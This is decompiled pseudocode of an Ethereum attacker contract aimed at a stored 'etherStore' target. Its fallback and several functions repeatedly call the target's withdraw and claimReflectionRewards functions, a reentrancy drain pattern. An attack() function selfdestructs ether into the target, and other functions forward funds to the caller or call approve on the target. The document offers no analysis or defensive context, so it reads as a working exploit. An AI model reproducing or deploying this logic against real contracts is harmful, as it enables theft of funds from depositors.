contract main {




// =====================  Runtime code  =====================


const getBalance = eth.balance(this.address)


address etherStoreAddress;

function etherStore() {
    return etherStoreAddress
}

function sub_9198222c(?) payable {
    selfdestruct(etherStoreAddress)
}

function attack() payable {
    selfdestruct(etherStoreAddress)
}

function sub_989f6551(?) payable {
    call msg.sender with:
       value 10^10 wei
         gas gas_remaining wei
}

function te() payable {
    require ext_code.size(etherStoreAddress)
    call etherStoreAddress.0x3ccfd60b with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function _fallback() payable {
    require ext_code.size(etherStoreAddress)
    call etherStoreAddress.claimReflectionRewards() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function sub_419efc03(?) payable {
    require ext_code.size(etherStoreAddress)
    call etherStoreAddress.claimReflectionRewards() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function wd() payable {
    require ext_code.size(etherStoreAddress)
    call etherStoreAddress.0x3ccfd60b with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    call msg.sender with:
       value 10^10 wei
         gas gas_remaining wei
}

function sub_d6ce0095(?) payable {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    require ext_code.size(etherStoreAddress)
    call etherStoreAddress.approve(address arg1, uint256 arg2) with:
         gas gas_remaining wei
        args address(arg1), arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
